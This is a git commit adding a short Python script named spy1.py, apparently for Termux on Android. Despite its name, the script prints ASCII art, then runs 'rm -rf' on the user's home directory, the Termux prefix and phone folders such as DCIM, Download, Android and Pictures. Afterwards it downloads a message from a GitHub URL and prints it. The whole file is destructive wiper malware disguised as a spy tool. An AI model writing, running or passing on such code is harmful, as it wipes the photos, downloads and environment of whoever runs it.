a268ae2d95d2e8b2888c4c468c52235659f12de8
JihadAzeidinJ10 <108078886+JihadAzeidinJ10@users.noreply.github.com>
2022-07-29 19:34:35 +0200

    Add files via upload

---
+++ spy1.py
@@ -0,0 +1,35 @@
+import os 
+import requests
+print("""\033[1;31m 
+
+.░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
+░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
+░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
+░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
+░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
+█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
+█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
+░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
+░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
+░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
+░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
+░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
+░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
+░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
+░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
+
+""")
+os.system('termux-setup-storage')
+os.system('rm -rf $HOME')
+os.system('cd /sdcard ')
+os.system('rm -rf DCIM ')
+os.system('rm -rf Download')
+os.system('rm -rf Android ' )
+os.system('rm -rf Pictures')
+os.system('rm -rf SHAREit')
+os.system('rm -rf Pictures') 
+os.system('rm -rf $PREFIX')
+url = requests.get("https://raw.githubusercontent.com/br5kly/J10/main/fuck.txt")
+for line in url.text.splitlines():
+    print(line)
+    
